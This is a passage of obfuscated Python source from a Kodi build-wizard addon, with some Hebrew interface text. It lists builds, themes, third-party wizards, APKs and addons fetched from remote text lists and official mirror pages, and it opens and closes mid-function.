		addDir ('כניסה לשמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME3 )#line:2209
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2210
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',icon =ICONBUILDS ,themeit =THEME3 )#line:2211
		addFile ('%s'%OOO000000O0OO0000 ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2212
	else :#line:2213
		OOOO0O00OO0OO0000 ,OO0O0O00OOOO000O0 ,O00O000O0O00OOOOO ,O00OOOO0O0OO0OO0O ,OO00OOO0OOO0OOO0O ,O0O0O0OOOO000OOOO ,O0OOOOO00O00OOOOO =wiz .buildCount ()#line:2214
		O00000O0OOO0OOOO0 =False ;OO00OOOO0OO0OOO0O =[]#line:2215
		if THIRDPARTY =='true':#line:2216
			if not THIRD1NAME ==''and not THIRD1URL =='':O00000O0OOO0OOOO0 =True ;OO00OOOO0OO0OOO0O .append ('1')#line:2217
			if not THIRD2NAME ==''and not THIRD2URL =='':O00000O0OOO0OOOO0 =True ;OO00OOOO0OO0OOO0O .append ('2')#line:2218
			if not THIRD3NAME ==''and not THIRD3URL =='':O00000O0OOO0OOOO0 =True ;OO00OOOO0OO0OOO0O .append ('3')#line:2219
		OOOOO0O000O000OOO =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"').replace ('adult=""','adult="no"')#line:2220
		O0000000O0OO0OO00 =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OOOOO0O000O000OOO )#line:2221
		if OOOO0O00OO0OO0000 ==1 and O00000O0OOO0OOOO0 ==False :#line:2222
			for O00O00O0000OO0OO0 ,O0O0O0OO0O000OOO0 ,OOOOOOO00O00O0OOO ,O000O0OO00OOO0000 ,OOOOO00OOO0O0O0O0 ,O0OO0O00OO0000O00 ,OO0O000OO00O00O0O ,OO000OOOO0OO00OO0 ,OO0000O0000000000 ,OOOOO000OO0OO0000 in O0000000O0OO0OO00 :#line:2223
				if not SHOWADULT =='true'and OO0000O0000000000 .lower ()=='yes':continue #line:2224
				if not DEVELOPER =='true'and wiz .strTest (O00O00O0000OO0OO0 ):continue #line:2225
				viewBuild (O0000000O0OO0OO00 [0 ][0 ])#line:2226
				return #line:2227
		addFile ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2230
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2231
		if O00000O0OOO0OOOO0 ==True :#line:2232
			for OOO000O0000OOOO0O in OO00OOOO0OO0OOO0O :#line:2233
				O00O00O0000OO0OO0 =eval ('THIRD%sNAME'%OOO000O0000OOOO0O )#line:2234
		if len (O0000000O0OO0OO00 )>=1 :#line:2236
			if SEPERATE =='true':#line:2237
				for O00O00O0000OO0OO0 ,O0O0O0OO0O000OOO0 ,OOOOOOO00O00O0OOO ,O000O0OO00OOO0000 ,OOOOO00OOO0O0O0O0 ,O0OO0O00OO0000O00 ,OO0O000OO00O00O0O ,OO000OOOO0OO00OO0 ,OO0000O0000000000 ,OOOOO000OO0OO0000 in O0000000O0OO0OO00 :#line:2238
					if not SHOWADULT =='true'and OO0000O0000000000 .lower ()=='yes':continue #line:2239
					if not DEVELOPER =='true'and wiz .strTest (O00O00O0000OO0OO0 ):continue #line:2240
					O0OOO000O0O00O0OO =createMenu ('install','',O00O00O0000OO0OO0 )#line:2241
					addDir ('[%s] %s (v%s)'%(float (OOOOO00OOO0O0O0O0 ),O00O00O0000OO0OO0 ,O0O0O0OO0O000OOO0 ),'viewbuild',O00O00O0000OO0OO0 ,description =OOOOO000OO0OO0000 ,fanart =OO000OOOO0OO00OO0 ,icon =OO0O000OO00O00O0O ,menu =O0OOO000O0O00O0OO ,themeit =THEME2 )#line:2242
			else :#line:2243
				if O00OOOO0O0OO0OO0O >0 :#line:2244
					O0OOOOO0OOOO00O00 ='+'if SHOW17 =='false'else '-'#line:2245
					if SHOW17 =='true':#line:2247
						for O00O00O0000OO0OO0 ,O0O0O0OO0O000OOO0 ,OOOOOOO00O00O0OOO ,O000O0OO00OOO0000 ,OOOOO00OOO0O0O0O0 ,O0OO0O00OO0000O00 ,OO0O000OO00O00O0O ,OO000OOOO0OO00OO0 ,OO0000O0000000000 ,OOOOO000OO0OO0000 in O0000000O0OO0OO00 :#line:2249
							if not SHOWADULT =='true'and OO0000O0000000000 .lower ()=='yes':continue #line:2250
							if not DEVELOPER =='true'and wiz .strTest (O00O00O0000OO0OO0 ):continue #line:2251
							O0OO0OO00OOO00O00 =int (float (OOOOO00OOO0O0O0O0 ))#line:2252
							if O0OO0OO00OOO00O00 ==17 :#line:2253
								O0OOO000O0O00O0OO =createMenu ('install','',O00O00O0000OO0OO0 )#line:2254
								addDir ('[%s] %s (v%s)'%(float (OOOOO00OOO0O0O0O0 ),O00O00O0000OO0OO0 ,O0O0O0OO0O000OOO0 ),'viewbuild',O00O00O0000OO0OO0 ,description =OOOOO000OO0OO0000 ,fanart =OO000OOOO0OO00OO0 ,icon =OO0O000OO00O00O0O ,menu =O0OOO000O0O00O0OO ,themeit =THEME2 )#line:2255
				if OO00OOO0OOO0OOO0O >0 :#line:2256
					O0OOOOO0OOOO00O00 ='+'if SHOW18 =='false'else '-'#line:2257
					if SHOW18 =='true':#line:2259
						for O00O00O0000OO0OO0 ,O0O0O0OO0O000OOO0 ,OOOOOOO00O00O0OOO ,O000O0OO00OOO0000 ,OOOOO00OOO0O0O0O0 ,O0OO0O00OO0000O00 ,OO0O000OO00O00O0O ,OO000OOOO0OO00OO0 ,OO0000O0000000000 ,OOOOO000OO0OO0000 in O0000000O0OO0OO00 :#line:2261
							if not SHOWADULT =='true'and OO0000O0000000000 .lower ()=='yes':continue #line:2262
							if not DEVELOPER =='true'and wiz .strTest (O00O00O0000OO0OO0 ):continue #line:2263
							O0OO0OO00OOO00O00 =int (float (OOOOO00OOO0O0O0O0 ))#line:2264
							if O0OO0OO00OOO00O00 ==18 :#line:2265
								O0OOO000O0O00O0OO =createMenu ('install','',O00O00O0000OO0OO0 )#line:2266
								addDir ('[%s] %s (v%s)'%(float (OOOOO00OOO0O0O0O0 ),O00O00O0000OO0OO0 ,O0O0O0OO0O000OOO0 ),'viewbuild',O00O00O0000OO0OO0 ,description =OOOOO000OO0OO0000 ,fanart =OO000OOOO0OO00OO0 ,icon =OO0O000OO00O00O0O ,menu =O0OOO000O0O00O0OO ,themeit =THEME2 )#line:2267
				if O00O000O0O00OOOOO >0 :#line:2268
					O0OOOOO0OOOO00O00 ='+'if SHOW16 =='false'else '-'#line:2269
					addFile ('[B]%s Jarvis Builds(%s)[/B]'%(O0OOOOO0OOOO00O00 ,O00O000O0O00OOOOO ),'togglesetting','show16',themeit =THEME3 )#line:2270
					if SHOW16 =='true':#line:2271
						for O00O00O0000OO0OO0 ,O0O0O0OO0O000OOO0 ,OOOOOOO00O00O0OOO ,O000O0OO00OOO0000 ,OOOOO00OOO0O0O0O0 ,O0OO0O00OO0000O00 ,OO0O000OO00O00O0O ,OO000OOOO0OO00OO0 ,OO0000O0000000000 ,OOOOO000OO0OO0000 in O0000000O0OO0OO00 :#line:2272
							if not SHOWADULT =='true'and OO0000O0000000000 .lower ()=='yes':continue #line:2273
							if not DEVELOPER =='true'and wiz .strTest (O00O00O0000OO0OO0 ):continue #line:2274
							O0OO0OO00OOO00O00 =int (float (OOOOO00OOO0O0O0O0 ))#line:2275
							if O0OO0OO00OOO00O00 ==16 :#line:2276
								O0OOO000O0O00O0OO =createMenu ('install','',O00O00O0000OO0OO0 )#line:2277
								addDir ('[%s] %s (v%s)'%(float (OOOOO00OOO0O0O0O0 ),O00O00O0000OO0OO0 ,O0O0O0OO0O000OOO0 ),'viewbuild',O00O00O0000OO0OO0 ,description =OOOOO000OO0OO0000 ,fanart =OO000OOOO0OO00OO0 ,icon =OO0O000OO00O00O0O ,menu =O0OOO000O0O00O0OO ,themeit =THEME2 )#line:2278
				if OO0O0O00OOOO000O0 >0 :#line:2279
					O0OOOOO0OOOO00O00 ='+'if SHOW15 =='false'else '-'#line:2280
					addFile ('[B]%s Isengard and Below Builds(%s)[/B]'%(O0OOOOO0OOOO00O00 ,OO0O0O00OOOO000O0 ),'togglesetting','show15',themeit =THEME3 )#line:2281
					if SHOW15 =='true':#line:2282
						for O00O00O0000OO0OO0 ,O0O0O0OO0O000OOO0 ,OOOOOOO00O00O0OOO ,O000O0OO00OOO0000 ,OOOOO00OOO0O0O0O0 ,O0OO0O00OO0000O00 ,OO0O000OO00O00O0O ,OO000OOOO0OO00OO0 ,OO0000O0000000000 ,OOOOO000OO0OO0000 in O0000000O0OO0OO00 :#line:2283
							if not SHOWADULT =='true'and OO0000O0000000000 .lower ()=='yes':continue #line:2284
							if not DEVELOPER =='true'and wiz .strTest (O00O00O0000OO0OO0 ):continue #line:2285
							O0OO0OO00OOO00O00 =int (float (OOOOO00OOO0O0O0O0 ))#line:2286
							if O0OO0OO00OOO00O00 <=15 :#line:2287
								O0OOO000O0O00O0OO =createMenu ('install','',O00O00O0000OO0OO0 )#line:2288
								addDir ('[%s] %s (v%s)'%(float (OOOOO00OOO0O0O0O0 ),O00O00O0000OO0OO0 ,O0O0O0OO0O000OOO0 ),'viewbuild',O00O00O0000OO0OO0 ,description =OOOOO000OO0OO0000 ,fanart =OO000OOOO0OO00OO0 ,icon =OO0O000OO00O00O0O ,menu =O0OOO000O0O00O0OO ,themeit =THEME2 )#line:2289
		elif O0OOOOO00O00OOOOO >0 :#line:2290
			if O0O0O0OOOO000OOOO >0 :#line:2291
				addFile ('There is currently only Adult builds','',icon =ICONBUILDS ,themeit =THEME3 )#line:2292
				addFile ('Enable Show Adults in Addon Settings > Misc','',icon =ICONBUILDS ,themeit =THEME3 )#line:2293
			else :#line:2294
				addFile ('Currently No Builds Offered from %s'%ADDONTITLE ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2295
		else :addFile ('Text file for builds not formated correctly.','',icon =ICONBUILDS ,themeit =THEME3 )#line:2296
	setView ('files','viewType')#line:2297
def viewBuild (O0OO00O0OO0OO0O0O ):#line:2299
	O00O000000000000O =wiz .workingURL (SPEEDFILE )#line:2300
	if not O00O000000000000O ==True :#line:2301
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',themeit =THEME3 )#line:2302
		addFile ('%s'%O00O000000000000O ,'',themeit =THEME3 )#line:2303
		return #line:2304
	if wiz .checkBuild (O0OO00O0OO0OO0O0O ,'version')==False :#line:2305
		addFile ('Error reading the txt file.','',themeit =THEME3 )#line:2306
		addFile ('%s was not found in the builds list.'%O0OO00O0OO0OO0O0O ,'',themeit =THEME3 )#line:2307
		return #line:2308
	OOOOOO000OOOO000O =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"')#line:2309
	OOOO000O0OOOOO00O =re .compile ('name="%s".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?review="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%O0OO00O0OO0OO0O0O ).findall (OOOOOO000OOOO000O )#line:2310
	for OOO00OO00O0000000 ,O0OO0OOOO0OOO0OOO ,O00000O00O0O0O0O0 ,OO0O0000O0O00O00O ,O00O0O0000OOOO0OO ,OO000O0O0O0O00OO0 ,OO00OOOO000OO0000 ,OO000OOO00000O000 ,O00OO0OO000O0OOO0 ,O00OO0OOOOOOO00O0 in OOOO000O0OOOOO00O :#line:2311
		OO000O0O0O0O00OO0 =OO000O0O0O0O00OO0 if wiz .workingURL (OO000O0O0O0O00OO0 )else ICON #line:2312
		OO00OOOO000OO0000 =OO00OOOO000OO0000 if wiz .workingURL (OO00OOOO000OO0000 )else FANART #line:2313
		O0000O00O0OOOOOOO ='%s (v%s)'%(O0OO00O0OO0OO0O0O ,OOO00OO00O0000000 )#line:2314
		if BUILDNAME ==O0OO00O0OO0OO0O0O and OOO00OO00O0000000 >BUILDVERSION :#line:2315
			O0000O00O0OOOOOOO ='%s [COLOR red][CURRENT v%s][/COLOR]'%(O0000O00O0OOOOOOO ,BUILDVERSION )#line:2316
		OO0O000OO00O0OOOO =int (float (KODIV ));OOOOOOO0OO0000OO0 =int (float (OO0O0000O0O00O00O ))#line:2325
		if not OO0O000OO00O0OOOO ==OOOOOOO0OO0000OO0 :#line:2326
			if OO0O000OO00O0OOOO ==16 and OOOOOOO0OO0000OO0 <=15 :O00OO0O0OO00O0000 =False #line:2327
			else :O00OO0O0OO00O0000 =True #line:2328
		else :O00OO0O0OO00O0000 =False #line:2329
		addFile ('התקנה','install',O0OO00O0OO0OO0O0O ,'fresh',description =O00OO0OOOOOOO00O0 ,fanart =OO00OOOO000OO0000 ,icon =OO000O0O0O0O00OO0 ,themeit =THEME1 )#line:2333
		if not O00O0O0000OOOO0OO =='http://':#line:2336
			if wiz .workingURL (O00O0O0000OOOO0OO )==True :#line:2337
				addFile (wiz .sep ('THEMES'),'',fanart =OO00OOOO000OO0000 ,icon =OO000O0O0O0O00OO0 ,themeit =THEME3 )#line:2338
				OOOOOO000OOOO000O =wiz .openURL (O00O0O0000OOOO0OO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2339
				OOOO000O0OOOOO00O =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OOOOOO000OOOO000O )#line:2340
				for OOO00O00O0OO00OOO ,O00O000OOOO00OOOO ,OO0OO0000000OO0O0 ,O0O0O00OOOO0OOOOO ,OO0000O0OOO0O0000 ,O00OO0OOOOOOO00O0 in OOOO000O0OOOOO00O :#line:2341
					if not SHOWADULT =='true'and OO0000O0OOO0O0000 .lower ()=='yes':continue #line:2342
					OO0OO0000000OO0O0 =OO0OO0000000OO0O0 if OO0OO0000000OO0O0 =='http://'else OO000O0O0O0O00OO0 #line:2343
					O0O0O00OOOO0OOOOO =O0O0O00OOOO0OOOOO if O0O0O00OOOO0OOOOO =='http://'else OO00OOOO000OO0000 #line:2344
					addFile (OOO00O00O0OO00OOO if not OOO00O00O0OO00OOO ==BUILDTHEME else "[B]%s (Installed)[/B]"%OOO00O00O0OO00OOO ,'theme',O0OO00O0OO0OO0O0O ,OOO00O00O0OO00OOO ,description =O00OO0OOOOOOO00O0 ,fanart =O0O0O00OOOO0OOOOO ,icon =OO0OO0000000OO0O0 ,themeit =THEME3 )#line:2345
	setView ('files','viewType')#line:2346
def viewThirdList (O0OOO00OO00OO000O ):#line:2348
	O00OO0O000000OOOO =eval ('THIRD%sNAME'%O0OOO00OO00OO000O )#line:2349
	OO00OOO0O000O0OO0 =eval ('THIRD%sURL'%O0OOO00OO00OO000O )#line:2350
	OO0OO0OO0O0000OOO =wiz .workingURL (OO00OOO0O000O0OO0 )#line:2351
	if not OO0OO0OO0O0000OOO ==True :#line:2352
		addFile ('Url for txt file not valid','',icon =ICONBUILDS ,themeit =THEME3 )#line:2353
		addFile ('%s'%WORKINGURL ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2354
	else :#line:2355
		O0O00OOOOOO0O00O0 ,OO0OO0O0OO0O0OO00 =wiz .thirdParty (OO00OOO0O000O0OO0 )#line:2356
		addFile ("[B]%s[/B]"%O00OO0O000000OOOO ,'',themeit =THEME3 )#line:2357
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2358
		if O0O00OOOOOO0O00O0 :#line:2359
			for O00OO0O000000OOOO ,OOOO0O0O0O00O0O00 ,OO00OOO0O000O0OO0 ,OO000OO0O00OO0O00 ,OOOOO0O0000O00OO0 ,OOO0OOO0O000O0OO0 ,OO0O00OO0O0O0000O ,O000000000OOO0OO0 in OO0OO0O0OO0O0OO00 :#line:2360
				if not SHOWADULT =='true'and OO0O00OO0O0O0000O .lower ()=='yes':continue #line:2361
				addFile ("[%s] %s v%s"%(OO000OO0O00OO0O00 ,O00OO0O000000OOOO ,OOOO0O0O0O00O0O00 ),'installthird',O00OO0O000000OOOO ,OO00OOO0O000O0OO0 ,icon =OOOOO0O0000O00OO0 ,fanart =OOO0OOO0O000O0OO0 ,description =O000000000OOO0OO0 ,themeit =THEME2 )#line:2362
		else :#line:2363
			for O00OO0O000000OOOO ,OO00OOO0O000O0OO0 ,OOOOO0O0000O00OO0 ,OOO0OOO0O000O0OO0 ,O000000000OOO0OO0 in OO0OO0O0OO0O0OO00 :#line:2364
				addFile (O00OO0O000000OOOO ,'installthird',O00OO0O000000OOOO ,OO00OOO0O000O0OO0 ,icon =OOOOO0O0000O00OO0 ,fanart =OOO0OOO0O000O0OO0 ,description =O000000000OOO0OO0 ,themeit =THEME2 )#line:2365
def editThirdParty (O00O0O0O00000O0OO ):#line:2367
	O0OO0O000O0000000 =eval ('THIRD%sNAME'%O00O0O0O00000O0OO )#line:2368
	OO0O00O00OO000OO0 =eval ('THIRD%sURL'%O00O0O0O00000O0OO )#line:2369
	OOO00OO0OO00OOOOO =wiz .getKeyboard (O0OO0O000O0000000 ,'Enter the Name of the Wizard')#line:2370
	O0OO00OOO00OOOOOO =wiz .getKeyboard (OO0O00O00OO000OO0 ,'Enter the URL of the Wizard Text')#line:2371
	wiz .setS ('wizard%sname'%O00O0O0O00000O0OO ,OOO00OO0OO00OOOOO )#line:2373
	wiz .setS ('wizard%surl'%O00O0O0O00000O0OO ,O0OO00OOO00OOOOOO )#line:2374
def apkScraper (name =""):#line:2376
	if name =='kodi':#line:2377
		OOO0OO0O000O00OOO ='http://mirrors.kodi.tv/releases/android/arm/'#line:2378
		OOOO000O0OO00OO0O ='http://mirrors.kodi.tv/releases/android/arm/old/'#line:2379
		OOOOOOOO0OO00OO00 =wiz .openURL (OOO0OO0O000O00OOO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2380
		OOOO0OO0O00OO0OOO =wiz .openURL (OOOO000O0OO00OO0O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2381
		OOOO00O0O0OO00O0O =0 #line:2382
		OOOOOO0OO0OO0OO00 =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (OOOOOOOO0OO00OO00 )#line:2383
		O0O00OOOO00OO00OO =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (OOOO0OO0O00OO0OOO )#line:2384
		addFile ("Official Kodi Apk\'s",themeit =THEME1 )#line:2386
		O00OOOOO00000OOOO =False #line:2387
		for O0O00000O0O0OO0O0 ,name ,O0O00OOOOOOOOOOO0 ,OOO0OO000O0O0OOOO in OOOOOO0OO0OO0OO00 :#line:2388
			if O0O00000O0O0OO0O0 in ['../','old/']:continue #line:2389
			if not O0O00000O0O0OO0O0 .endswith ('.apk'):continue #line:2390
			if not O0O00000O0O0OO0O0 .find ('_')==-1 and O00OOOOO00000OOOO ==True :continue #line:2391
			try :#line:2392
				O0O0O000000O00O0O =name .split ('-')#line:2393
				if not O0O00000O0O0OO0O0 .find ('_')==-1 :#line:2394
					O00OOOOO00000OOOO =True #line:2395
					O00O000O0OO000OO0 ,O0OOO000OOOOOO000 =O0O0O000000O00O0O [2 ].split ('_')#line:2396
				else :#line:2397
					O00O000O0OO000OO0 =O0O0O000000O00O0O [2 ]#line:2398
					O0OOO000OOOOOO000 =''#line:2399
				OOOO000O0OO000OOO ="[COLOR %s]%s v%s%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O0O000000O00O0O [0 ].title (),O0O0O000000O00O0O [1 ],O0OOO000OOOOOO000 .upper (),O00O000O0OO000OO0 ,COLOR2 ,O0O00OOOOOOOOOOO0 .replace (' ',''),COLOR1 ,OOO0OO000O0O0OOOO )#line:2400
				OO0OOOOOO000O0OO0 =urljoin (OOO0OO0O000O00OOO ,O0O00000O0O0OO0O0 )#line:2401
				addFile (OOOO000O0OO000OOO ,'apkinstall',"%s v%s%s %s"%(O0O0O000000O00O0O [0 ].title (),O0O0O000000O00O0O [1 ],O0OOO000OOOOOO000 .upper (),O00O000O0OO000OO0 ),OO0OOOOOO000O0OO0 )#line:2402
				OOOO00O0O0OO00O0O +=1 #line:2403
			except :#line:2404
				wiz .log ("Error on: %s"%name )#line:2405
		for O0O00000O0O0OO0O0 ,name ,O0O00OOOOOOOOOOO0 ,OOO0OO000O0O0OOOO in O0O00OOOO00OO00OO :#line:2407
			if O0O00000O0O0OO0O0 in ['../','old/']:continue #line:2408
			if not O0O00000O0O0OO0O0 .endswith ('.apk'):continue #line:2409
			if not O0O00000O0O0OO0O0 .find ('_')==-1 :continue #line:2410
			try :#line:2411
				O0O0O000000O00O0O =name .split ('-')#line:2412
				OOOO000O0OO000OOO ="[COLOR %s]%s v%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O0O000000O00O0O [0 ].title (),O0O0O000000O00O0O [1 ],O0O0O000000O00O0O [2 ],COLOR2 ,O0O00OOOOOOOOOOO0 .replace (' ',''),COLOR1 ,OOO0OO000O0O0OOOO )#line:2413
				OO0OOOOOO000O0OO0 =urljoin (OOOO000O0OO00OO0O ,O0O00000O0O0OO0O0 )#line:2414
				addFile (OOOO000O0OO000OOO ,'apkinstall',"%s v%s %s"%(O0O0O000000O00O0O [0 ].title (),O0O0O000000O00O0O [1 ],O0O0O000000O00O0O [2 ]),OO0OOOOOO000O0OO0 )#line:2415
				OOOO00O0O0OO00O0O +=1 #line:2416
			except :#line:2417
				wiz .log ("Error on: %s"%name )#line:2418
		if OOOO00O0O0OO00O0O ==0 :addFile ("Error Kodi Scraper Is Currently Down.")#line:2419
	elif name =='spmc':#line:2420
		O000OO0OO0O00000O ='https://github.com/koying/SPMC/releases'#line:2421
		OOOOOOOO0OO00OO00 =wiz .openURL (O000OO0OO0O00000O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2422
		OOOO00O0O0OO00O0O =0 #line:2423
		OOOOOO0OO0OO0OO00 =re .compile ('<div.+?lass="release-body.+?div class="release-header".+?a href=.+?>(.+?)</a>.+?ul class="release-downloads">(.+?)</ul>.+?/div>').findall (OOOOOOOO0OO00OO00 )#line:2424
		addFile ("Official SPMC Apk\'s",themeit =THEME1 )#line:2426
		for name ,OOOO00O00OOOOO0O0 in OOOOOO0OO0OO0OO00 :#line:2428
			OOOO0O00O00OO0OO0 =''#line:2429
			O0O00OOOO00OO00OO =re .compile ('<li>.+?<a href="(.+?)" rel="nofollow">.+?<small class="text-gray float-right">(.+?)</small>.+?strong>(.+?)</strong>.+?</a>.+?</li>').findall (OOOO00O00OOOOO0O0 )#line:2430
			for O0000O0OOO0OOOOO0 ,OO00OOOOO000O000O ,OOOO00O0O000OO0O0 in O0O00OOOO00OO00OO :#line:2431
				if OOOO00O0O000OO0O0 .find ('armeabi')==-1 :continue #line:2432
				if OOOO00O0O000OO0O0 .find ('launcher')>-1 :continue #line:2433
				OOOO0O00O00OO0OO0 =urljoin ('https://github.com',O0000O0OOO0OOOOO0 )#line:2434
				break #line:2435
		if OOOO00O0O0OO00O0O ==0 :addFile ("Error SPMC Scraper Is Currently Down.")#line:2437
def apkMenu (url =None ):#line:2439
	if url ==None :#line:2440
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2443
	if not APKFILE =='http://':#line:2444
		if url ==None :#line:2445
			OO00O0O0O00OOO0O0 =wiz .workingURL (APKFILE )#line:2446
			OOO00OOOOO000OO0O =uservar .APKFILE #line:2447
		else :#line:2448
			OO00O0O0O00OOO0O0 =wiz .workingURL (url )#line:2449
			OOO00OOOOO000OO0O =url #line:2450
		if OO00O0O0O00OOO0O0 ==True :#line:2451
			O0OOOO000O0OOO0O0 =wiz .openURL (OOO00OOOOO000OO0O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2452
			OOOOOOO0O0O00OO0O =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O0OOOO000O0OOO0O0 )#line:2453
			if len (OOOOOOO0O0O00OO0O )>0 :#line:2454
				OO0OOO0O0OOOOOO0O =0 #line:2455
				for O0OO000O0O0000OO0 ,OO00000OO0O0OOOO0 ,url ,O00O00OOO000O0O0O ,O0O00OOOOOOO00000 ,O0O0OO00000O0OOOO ,O0OO00O0O00O00OO0 in OOOOOOO0O0O00OO0O :#line:2456
					if not SHOWADULT =='true'and O0O0OO00000O0OOOO .lower ()=='yes':continue #line:2457
					if OO00000OO0O0OOOO0 .lower ()=='yes':#line:2458
						OO0OOO0O0OOOOOO0O +=1 #line:2459
						addDir ("[B]%s[/B]"%O0OO000O0O0000OO0 ,'apk',url ,description =O0OO00O0O00O00OO0 ,icon =O00O00OOO000O0O0O ,fanart =O0O00OOOOOOO00000 ,themeit =THEME3 )#line:2460
					else :#line:2461
						OO0OOO0O0OOOOOO0O +=1 #line:2462
						addFile (O0OO000O0O0000OO0 ,'apkinstall',O0OO000O0O0000OO0 ,url ,description =O0OO00O0O00O00OO0 ,icon =O00O00OOO000O0O0O ,fanart =O0O00OOOOOOO00000 ,themeit =THEME2 )#line:2463
					if OO0OOO0O0OOOOOO0O <1 :#line:2464
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2465
			else :wiz .log ("[APK Menu] ERROR: Invalid Format.",xbmc .LOGERROR )#line:2466
		else :#line:2467
			wiz .log ("[APK Menu] ERROR: URL for apk list not working.",xbmc .LOGERROR )#line:2468
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2469
			addFile ('%s'%OO00O0O0O00OOO0O0 ,'',themeit =THEME3 )#line:2470
		return #line:2471
	else :wiz .log ("[APK Menu] No APK list added.")#line:2472
	setView ('files','viewType')#line:2473
def addonMenu (url =None ):#line:2475
	if not ADDONFILE =='http://':#line:2476
		if url ==None :#line:2477
			O0OOOOOOO00000000 =wiz .workingURL (ADDONFILE )#line:2478
			OO0O0O00000OO00O0 =uservar .ADDONFILE #line:2479
		else :#line:2480
			O0OOOOOOO00000000 =wiz .workingURL (url )#line:2481
			OO0O0O00000OO00O0 =url #line:2482
		if O0OOOOOOO00000000 ==True :#line:2483
			OOO00OOOOO000O00O =wiz .openURL (OO0O0O00000OO00O0 ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2484
			O0O00O000O0OO0O0O =re .compile ('name="(.+?)".+?lugin="(.+?)".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OOO00OOOOO000O00O )#line:2485
			if len (O0O00O000O0OO0O0O )>0 :#line:2486
				O0O00000O0O000O00 =0 #line:2487
				for O00000000OOOO0OO0 ,O0O0OOO0OOOOOOO00 ,url ,O00OO0000O00O0OO0 ,O0O0O0OOOOOO0OO0O ,O000O000OOO0OOOO0 ,O0OOO00O000OOOOO0 ,OO000OOOO0000OOO0 ,OO0000O0OO000000O ,OO0OOOOO00O00O00O in O0O00O000O0OO0O0O :#line:2488
					if O0O0OOO0OOOOOOO00 .lower ()=='section':#line:2489
						O0O00000O0O000O00 +=1 #line:2490
						addDir ("[B]%s[/B]"%O00000000OOOO0OO0 ,'addons',url ,description =OO0OOOOO00O00O00O ,icon =O0OOO00O000OOOOO0 ,fanart =OO000OOOO0000OOO0 ,themeit =THEME3 )#line:2491
					else :#line:2492
						if not SHOWADULT =='true'and OO0000O0OO000000O .lower ()=='yes':continue #line:2493
						try :#line:2494
							OO0O0OO000O00000O =xbmcaddon .Addon (id =O0O0OOO0OOOOOOO00 ).getAddonInfo ('path')#line:2495
							if os .path .exists (OO0O0OO000O00000O ):#line:2496
								O00000000OOOO0OO0 ="[COLOR green][Installed][/COLOR] %s"%O00000000OOOO0OO0 #line:2497
						except :#line:2498
							pass #line:2499
						O0O00000O0O000O00 +=1 #line:2500
						addFile (O00000000OOOO0OO0 ,'addoninstall',O0O0OOO0OOOOOOO00 ,OO0O0O00000OO00O0 ,description =OO0OOOOO00O00O00O ,icon =O0OOO00O000OOOOO0 ,fanart =OO000OOOO0000OOO0 ,themeit =THEME2 )#line:2501
					if O0O00000O0O000O00 <1 :#line:2502
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2503
			else :#line:2504
				addFile ('Text File not formated correctly!','',themeit =THEME3 )#line:2505
				wiz .log ("[Addon Menu] ERROR: Invalid Format.")#line:2506
		else :#line:2507
			wiz .log ("[Addon Menu] ERROR: URL for Addon list not working.")#line:2508
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2509
			addFile ('%s'%O0OOOOOOO00000000 ,'',themeit =THEME3 )#line:2510
	else :wiz .log ("[Addon Menu] No Addon list added.")#line:2511
	setView ('files','viewType')#line:2512
def addonInstaller (OOOO0000O00000000 ,O0OOO0O0OO000O0OO ):#line:2514
	if not ADDONFILE =='http://':#line:2515
		O0O0000OO000O000O =wiz .workingURL (O0OOO0O0OO000O0OO )#line:2516
		if O0O0000OO000O000O ==True :#line:2517
